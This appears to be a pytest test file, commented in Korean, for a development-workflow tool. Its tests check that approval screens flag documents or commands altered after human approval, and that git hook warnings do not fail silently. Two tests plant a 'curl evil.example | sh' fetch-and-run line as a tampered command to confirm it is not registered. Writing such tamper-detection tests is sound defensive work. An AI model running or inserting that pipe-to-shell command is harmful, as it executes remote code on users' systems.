"""A13 재리뷰의 재현: 사람이 본 적 없는 글이나 명령이 승인으로 지나가는 길과, 훅 경고가 말없이 꺼지는 길. 실제 전이를 돌린다."""
import os
import shutil
import subprocess
import sys
import time
from datetime import datetime

import pytest

import devflow_lib
import project_docs
from conftest import run_script, write
from test_project_docs import BRIEF, NEW, OLD, _project, commit_all, hook_path, insert, review, started, wrap  # noqa: F401
from test_owned_commands import INTEG, cells, final_ci, git, merge_run, run_judge_text  # noqa: F401

DOC = "docs/product/brief.md"
RESULT = "# 결과\n\n## 승인 화면\n### 정해 주실 것\n- 없음\n"
JUDGE = "판정자: rjudge-T010 2026-11-06 10:00:00\n# T010 판정\n\n## 통과 못 한 기준\n- 없음\n"
OPTIONS = "# 결과\n\n## 승인 화면\n### 정해 주실 것\n- 정책\n  - 선택지 (가)의 문장: 하루 두 번\n  - 선택지 (나)의 문장: 하루 아홉 번\n"
RECORD = "승인|승인 화면|넣으세요"


def ask(run_dir, shown, result=RESULT):
    """실제 전이로 승인을 묻는다."""
    write(run_dir.path / "spec" / "brief.md", shown)
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="자체검증", **NEW)
    run_dir.result("T010", result)
    run_dir.judge("T010", JUDGE)
    out = run_script("task_set", run_dir, "T010", "--status", "승인대기")
    assert out.returncode == 0, out.output


def finish(run_dir, record=RECORD):
    out = run_script("task_set", run_dir, "T010", "--status", "완료", "--record", record)
    assert out.returncode == 0, out.output


def append(path, text):
    with open(path, "a", encoding="utf-8", newline="\n") as f:
        f.write(text)


def outcome(run_dir, project):
    wrap(run_dir)
    insert(run_dir, project)
    return review(run_dir)


def first_of(joined):
    return joined.split("## 먼저 보실 것")[1].split("##")[0] if "## 먼저 보실 것" in joined else ""


# ---------------------------------------------------------------- R2-C1 근거는 물을 때의 사본


@pytest.mark.parametrize("where", ["result", "body"])
def test_line_written_to_the_result_after_the_screen_does_not_explain(run_dir, project, where):
    started(run_dir, project)
    ask(run_dir, BRIEF, OPTIONS if where == "result" else RESULT)
    write(run_dir.path / "spec" / "brief.md", BRIEF + "모든 사용자의 데이터를 지운다\n")
    append(run_dir.task_dir("T010") / "result.md", "\n## 본문\n- 모든 사용자의 데이터를 지운다\n- 선택지 (가)의 문장: 모든 사용자의 데이터를 지운다\n")
    finish(run_dir, "승인|승인 화면|(가)로 하세요" if where == "result" else RECORD)
    joined = outcome(run_dir, project)
    assert "승인 화면 뒤 달라짐: " + DOC in joined and "승인한 그대로" not in joined
    assert "+모든 사용자의 데이터를 지운다" in joined and "승인 화면 뒤 달라짐 1" in first_of(joined)


def test_judge_finding_is_not_evidence(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF)
    write(run_dir.path / "spec" / "brief.md", BRIEF + "잘못 들어간 줄\n")
    append(run_dir.task_dir("T010") / "judge.md", "\n## 권장\n- `잘못 들어간 줄`은 근거가 없다\n- 잘못 들어간 줄\n")
    finish(run_dir)
    assert "승인 화면 뒤 달라짐: " + DOC in outcome(run_dir, project)


def test_judge_finding_written_before_asking_is_not_evidence_either(run_dir, project):
    started(run_dir, project)
    write(run_dir.path / "spec" / "brief.md", BRIEF)
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="자체검증", **NEW)
    run_dir.result("T010", RESULT)
    run_dir.judge("T010", JUDGE + "\n## 권장\n- 잘못 들어간 줄\n")
    assert run_script("task_set", run_dir, "T010", "--status", "승인대기").returncode == 0
    write(run_dir.path / "spec" / "brief.md", BRIEF + "잘못 들어간 줄\n")
    finish(run_dir)
    assert "승인 화면 뒤 달라짐: " + DOC in outcome(run_dir, project)


def test_judge_alternative_sentence_counts_when_the_answer_takes_it(run_dir, project):
    started(run_dir, project)
    write(run_dir.path / "spec" / "brief.md", BRIEF)
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="자체검증", **NEW)
    run_dir.result("T010", RESULT)
    run_dir.judge("T010", JUDGE + '\n## 권장\n- 대안 문장: "하루 두 번" 뜻 바뀜: 있음\n')
    assert run_script("task_set", run_dir, "T010", "--status", "승인대기").returncode == 0
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    finish(run_dir, "승인|승인 화면|판정자 대안대로 하세요")
    assert "승인한 그대로: " + DOC in outcome(run_dir, project)


# ---------------------------------------------------------------- R2-C2 부분 문자열


@pytest.mark.parametrize("before,after,note", [
    ("# 기획\n\n## 정책\n한도 50건\n", "# 기획\n\n## 정책\n한도 5\n", "- 선택지 (가)의 문장: 한도 50건으로 정했다\n"),
    ("# 기획\n\n## 정책\n허용\n", "# 기획\n\n## 정책\n허용\n허용 안\n", "- 선택지 (가)의 문장: 허용 안 함으로 정했다\n"),
])
def test_part_of_a_sentence_does_not_explain(run_dir, project, before, after, note):
    started(run_dir, project)
    ask(run_dir, before, RESULT.replace("- 없음\n", note))
    write(run_dir.path / "spec" / "brief.md", after)
    finish(run_dir, "승인|승인 화면|(가)로 하세요")
    assert "승인 화면 뒤 달라짐: " + DOC in outcome(run_dir, project)


@pytest.mark.parametrize("line", ["- 선택지 (가)의 문장: 하루 두 번", "- (가) 하루 두 번", "  - (가) 하루 두 번"])
def test_whole_body_of_the_chosen_sentence_explains(run_dir, project, line):
    started(run_dir, project)
    ask(run_dir, BRIEF, RESULT.replace("- 없음", line))
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    finish(run_dir, "승인|승인 화면|(가)로 하세요")
    assert "승인한 그대로: " + DOC in outcome(run_dir, project)


# ---------------------------------------------------------------- R2-M1 고른 선택지만


def test_unchosen_option_sentence_does_not_explain(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF, OPTIONS)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 아홉 번"))
    finish(run_dir, "승인|승인 화면|(가)로 하세요")
    joined = outcome(run_dir, project)
    assert "승인 화면 뒤 달라짐: " + DOC in joined and "승인한 그대로" not in joined


@pytest.mark.parametrize("answer", ["(가)로 하세요", "가", "3 가", "가로 하세요", "하루 두 번으로 하세요"])
def test_ways_of_choosing_the_option(run_dir, project, answer):
    started(run_dir, project)
    ask(run_dir, BRIEF, OPTIONS)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    finish(run_dir, "승인|승인 화면|" + answer)
    assert "승인한 그대로: " + DOC in outcome(run_dir, project)


@pytest.mark.parametrize("answer", ["좋습니다", "(가)와 (나) 둘 다"])
def test_answer_that_cannot_be_read_warns(run_dir, project, answer):
    started(run_dir, project)
    ask(run_dir, BRIEF, OPTIONS)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    finish(run_dir, "승인|승인 화면|" + answer)
    assert "승인 화면 뒤 달라짐: " + DOC in outcome(run_dir, project)


def prior_task(run_dir, line, answer):
    """앞 정본 줄이 있는 설계가 물을 때 사본을 뜨고, 답 뒤에 끝난다."""
    write(run_dir.path / "design" / "feat.md", "# 설계\n")
    run_dir.task("T020", "설계", {"건드릴 파일": "- design/feat.md"}, kind="design", block="설계", status="자체검증", **NEW)
    run_dir.result("T020", RESULT.replace("- 없음", "- 정책\n  - " + line))
    run_dir.judge("T020", JUDGE.replace("T010", "T020"))
    assert run_script("task_set", run_dir, "T020", "--status", "승인대기").returncode == 0
    return run_script("task_set", run_dir, "T020", "--status", "완료", "--record", "승인|승인 화면|" + answer)


def test_prior_line_of_the_chosen_option_is_stamped(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF)
    finish(run_dir)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    prior_task(run_dir, "선택지 (가)의 앞 정본 줄: spec/brief.md:3 | 지금: 하루 한 번 | 바뀜: 하루 두 번", "(가)로 하세요")
    assert project_docs.stamps(str(run_dir.path))["spec\\brief.md"]["task"] == "T020"


def test_prior_line_of_another_option_is_not_stamped(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF)
    finish(run_dir)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    prior_task(run_dir, "선택지 (나)의 앞 정본 줄: spec/brief.md:3 | 지금: 하루 한 번 | 바뀜: 하루 두 번\n  - 선택지 (가)의 문장: 그대로", "(가)로 하세요")
    assert project_docs.stamps(str(run_dir.path))["spec\\brief.md"]["task"] == "T010"


def test_prior_line_for_another_file_does_not_explain(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF)
    finish(run_dir)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    prior_task(run_dir, "선택지 (가)의 앞 정본 줄: spec/other.md:3 | 지금: 하루 한 번 | 바뀜: 하루 두 번", "(가)로 하세요")
    assert project_docs.stamps(str(run_dir.path))["spec\\brief.md"]["task"] == "T010"


# ---------------------------------------------------------------- 사본이 없거나 대조에 실패함


def test_missing_snapshot_is_not_approved_as_is(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF.replace("하루 한 번", "하루 두 번"))
    shutil.rmtree(run_dir.path / "approved" / "asked")
    finish(run_dir)
    joined = outcome(run_dir, project)
    assert "대조하지 못함: " + DOC in joined and "승인한 그대로" not in joined
    assert "대조하지 못함 1" in first_of(joined)


def test_snapshot_failure_in_the_transition_shows_as_not_compared(run_dir, project, monkeypatch):
    started(run_dir, project)
    write(run_dir.path / "spec" / "brief.md", BRIEF)
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="승인대기", **NEW)
    run_dir.result("T010", RESULT)
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="완료", **NEW)
    project_docs.stamp_task(str(run_dir.path), run_dir.tasks()["T010"])
    assert project_docs.stamps(str(run_dir.path))["spec\\brief.md"]["via"] == project_docs.UNCHECKED


def test_revised_without_snapshot_is_not_approved_as_is(run_dir, project):
    started(run_dir, project)
    run_dir.task("T011", "변경", kind="change", block="요구사항", status="완료", **NEW)
    write(run_dir.task_dir("T011") / "revised" / "spec" / "brief.md", BRIEF + "\n더함\n")
    assert run_script("apply_revision", run_dir, "T011").returncode == 0
    assert "대조하지 못함: " + DOC in outcome(run_dir, project)


def test_notified_path_never_asked_so_it_is_not_flagged(run_dir, project):
    started(run_dir, project)
    write(run_dir.path / "spec" / "brief.md", BRIEF.replace("하루 한 번", "하루 두 번"))
    run_dir.task("T010", "기획", {"건드릴 파일": "- spec/brief.md"}, kind="brief", block="요구사항", status="완료", approval_mode="알림", **NEW)
    project_docs.stamp_task(str(run_dir.path), run_dir.tasks()["T010"])
    joined = outcome(run_dir, project)
    assert "승인 없이 알림으로 지나감: " + DOC in joined and "대조하지 못함" not in joined


def test_unchanged_after_asking_needs_no_evidence(run_dir, project):
    started(run_dir, project)
    ask(run_dir, BRIEF.replace("하루 한 번", "하루 두 번"))
    finish(run_dir)
    assert "승인한 그대로: " + DOC in outcome(run_dir, project)


# ---------------------------------------------------------------- R2-C3 고친 판 HTML


def test_revised_html_changed_while_waiting_is_flagged(run_dir, project):
    started(run_dir, project)
    run_dir.task("T011", "변경", kind="change", block="요구사항", status="승인대기", **NEW)
    run_dir.result("T011", "# 결과\n")
    revised = run_dir.task_dir("T011") / "revised" / "ui" / "w.html"
    write(revised, "<p>보인 판</p>\n")
    project_docs.snapshot_asked(str(run_dir.path), run_dir.tasks()["T011"])
    write(revised, "<p>안 보인 판</p>\n")
    run_dir.task("T011", "변경", kind="change", block="요구사항", status="완료", **NEW)
    assert run_script("apply_revision", run_dir, "T011").returncode == 0
    joined = outcome(run_dir, project)
    assert "승인 화면 뒤 달라짐: docs/screens/w.html" in joined and "승인한 그대로" not in joined


def test_revised_html_unchanged_is_approved(run_dir, project):
    started(run_dir, project)
    run_dir.task("T011", "변경", kind="change", block="요구사항", status="승인대기", **NEW)
    run_dir.result("T011", "# 결과\n")
    write(run_dir.task_dir("T011") / "revised" / "ui" / "w.html", "<p>보인 판</p>\n")
    project_docs.snapshot_asked(str(run_dir.path), run_dir.tasks()["T011"])
    run_dir.task("T011", "변경", kind="change", block="요구사항", status="완료", **NEW)
    assert run_script("apply_revision", run_dir, "T011").returncode == 0
    assert "승인한 그대로: docs/screens/w.html" in outcome(run_dir, project)


# ---------------------------------------------------------------- R2-C4 등록은 사람이 본 줄만


PROPOSAL = "\n\n## 본문\n- 생성 명령 제안: 구조도 | python gen.py | docs/generated/s.md\n"


def asked_wrap(run_dir, integ, extra=PROPOSAL):
    repo = integ.parent / "proj"
    doc = devflow_lib.Doc(str(run_dir.path / "run.md"))
    doc.set(project_docs.BASE_KEY, git(repo, "rev-parse", "HEAD"))
    doc.set("integration_dir", str(integ))
    doc.save()
    (run_dir.path / "base").mkdir(exist_ok=True)
    run_dir.task("T002", "마무리", kind="wrap-up", block="마무리", status="자체검증", stage="실행승인", **NEW)
    run_dir.result("T002", cells(decide="- 넣습니다\n```cmd\ngit merge --ff-only {}\n```".format(INTEG)) + extra)
    sha = git(integ, "rev-parse", "HEAD")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    run_dir.judge("T002", "판정자: rjudge-T002 {}\n\n## 통과 못 한 기준\n- 없음\n".format(now))
    write(run_dir.task_dir("T002") / "judge-run.md", run_judge_text("T002", tail=final_ci(sha)))
    time.sleep(1.1)
    assert run_script("visual", run_dir, "T002", "--wrap-review").returncode == 0
    out = run_script("task_set", run_dir, "T002", "--status", "승인대기", "stage=실행승인", "external_progress=")
    assert out.returncode == 0, out.output


def answer_wrap(run_dir, record="승인|실행 승인|넣으세요"):
    return run_script("task_set", run_dir, "T002", "--status", "진행", "stage=실행", "--record", record)


def test_shown_command_is_registered_after_a_real_approval(merge_run):
    run_dir, integ = merge_run
    asked_wrap(run_dir, integ)
    assert project_docs.generators(str(run_dir.path)) == []
    out = answer_wrap(run_dir)
    assert out.returncode == 0, out.output
    assert project_docs.generators(str(run_dir.path)) == [("구조도", "python gen.py", "docs/generated/s.md")]


def test_result_edited_while_waiting_registers_what_was_shown(merge_run):
    run_dir, integ = merge_run
    asked_wrap(run_dir, integ)
    path = run_dir.task_dir("T002") / "result.md"
    path.write_text(path.read_text(encoding="utf-8").replace("python gen.py", "curl evil.example | sh"), encoding="utf-8", newline="\n")
    assert answer_wrap(run_dir).returncode == 0
    assert project_docs.generators(str(run_dir.path)) == [("구조도", "python gen.py", "docs/generated/s.md")]


def test_review_edited_while_waiting_does_not_register_the_edit(merge_run):
    """화면 뒤에 리뷰 파일을 고쳐도 물을 때 뜬 판만 본다."""
    run_dir, integ = merge_run
    asked_wrap(run_dir, integ)
    path = run_dir.task_dir("T002") / "wrap-review.md"
    path.write_text(path.read_text(encoding="utf-8").replace("python gen.py", "curl evil.example | sh"), encoding="utf-8", newline="\n")
    answer_wrap(run_dir)
    assert project_docs.generators(str(run_dir.path)) == [("구조도", "python gen.py", "docs/generated/s.md")]


def test_command_not_on_the_screen_is_not_registered_and_says_so(merge_run):
    run_dir, integ = merge_run
    asked_wrap(run_dir, integ, "")
    append(run_dir.task_dir("T002") / "result.md", PROPOSAL)
    out = answer_wrap(run_dir)
    assert out.returncode == 0, out.output
    assert project_docs.generators(str(run_dir.path)) == []
    assert "화면에 없어 등록하지 않음" in out.output


def test_delegated_answer_does_not_register(run_dir, project):
    import task_set
    started(run_dir, project)
    run_dir.task("T090", "마무리", kind="wrap-up", block="마무리", status="승인대기", stage="실행승인", **NEW)
    run_dir.result("T090", RESULT + PROPOSAL)
    write(run_dir.task_dir("T090") / "wrap-review.md", "- 등록할 생성 명령: 구조도 | python gen.py | docs/generated/s.md (승인하면 등록해 다음부터 돕니다)\n")
    project_docs.snapshot_asked(str(run_dir.path), run_dir.tasks()["T090"])
    run_dir.task("T090", "마무리", kind="wrap-up", block="마무리", status="진행", stage="실행", **NEW)
    task_set.after_docs_transition(str(run_dir.path), "T090", "진행", ("승인", "위임 관문", "자동"))
    assert project_docs.generators(str(run_dir.path)) == []


def test_old_wrap_up_registers_nothing(run_dir, project):
    import task_set
    started(run_dir, project)
    run_dir.task("T090", "마무리", kind="wrap-up", block="마무리", status="진행", stage="실행", **OLD)
    run_dir.result("T090", RESULT + PROPOSAL)
    task_set.after_docs_transition(str(run_dir.path), "T090", "진행", ("승인", "실행 승인", "넣으세요"))
    assert project_docs.generators(str(run_dir.path)) == []


# ---------------------------------------------------------------- R2-C5 훅


def hook_repo(run_dir, project):
    """지키는 경로가 있는 문서가 있는 저장소에 훅을 둔다."""
    started(run_dir, project)
    git(project, "config", "user.name", "t")
    git(project, "config", "user.email", "t@example.com")
    tip = git(project, "rev-parse", "HEAD")
    write(project_docs.state_path(str(run_dir.path)),
          "# 작성 문서 상태\n\n## 문서\n| 문서 | 지키는 경로 | 기준 커밋 | 상태 | 넣은 task |\n|---|---|---|---|---|\n"
          "| docs/product/brief.md | src/* | {} | 최신 | r/T090 |\n\n## 닫힌 항목\n".format(tip))
    assert run_script("project_docs", run_dir, "--hook").returncode == 0


def stub(folder, name):
    path = write(folder / name, "#!/bin/sh\necho 'Python was not found' >&2\nexit 9009\n")
    os.chmod(path, 0o755)


def real_commit(project, path_head):
    write(project / "src" / "a.py", "x = {}\n".format(time.time()))
    git(project, "add", "-A")
    env = dict(os.environ, PATH=os.pathsep.join(path_head + [os.environ["PATH"]]))
    return subprocess.run(["git", "-C", str(project), "commit", "-m", "시험"], capture_output=True, env=env, timeout=120)


def test_broken_python3_falls_through_to_the_next_candidate(run_dir, project, tmp_path):
    hook_repo(run_dir, project)
    stubs = tmp_path / "stubs"
    stub(stubs, "python3")
    done = real_commit(project, [str(stubs), os.path.dirname(sys.executable)])
    text = (done.stdout + done.stderr).decode("utf-8", "replace")
    assert done.returncode == 0 and "docs/product/brief.md의 지키는 경로가 바뀝니다" in text


def test_no_working_python_says_so_and_does_not_block(run_dir, project, tmp_path):
    hook_repo(run_dir, project)
    stubs = tmp_path / "stubs"
    for name in ("python3", "python", "py"):
        stub(stubs, name)
    done = real_commit(project, [str(stubs)])
    text = (done.stdout + done.stderr).decode("utf-8", "replace")
    assert done.returncode == 0 and "경고를 내지 못함" in text


def test_missing_script_says_so_and_does_not_block(run_dir, project):
    hook_repo(run_dir, project)
    path = hook_path(project)
    path.write_bytes(path.read_bytes().replace(b"project_docs.py", b"missing_script.py"))
    done = real_commit(project, [os.path.dirname(sys.executable)])
    assert done.returncode == 0 and "경고를 내지 못함" in (done.stdout + done.stderr).decode("utf-8", "replace")


# ---------------------------------------------------------------- R2-M2 훅 답 줄의 자리


def test_hook_answer_goes_before_the_first_section(run_dir, project):
    started(run_dir, project)
    settings = run_dir.path.parent / devflow_lib.PROJECT_SETTINGS
    write(settings, "# 프로젝트 설정\n- 줄 끝 고정: 안 함\n\n## 생성 명령\n- 구조도 | python -c \"print(1)\" | docs/generated/s.md\n")
    assert run_script("project_docs", run_dir, "--hook").returncode == 0
    text = settings.read_text(encoding="utf-8")
    assert text.index("- git 훅 경고: 적용함") < text.index("## 생성 명령")
    wrap(run_dir)
    out = run_script("project_docs", run_dir, "T090", "--generate", project)
    assert "읽지 못함" not in out.output
    assert project_docs.generators(str(run_dir.path))[0][0] == "구조도"
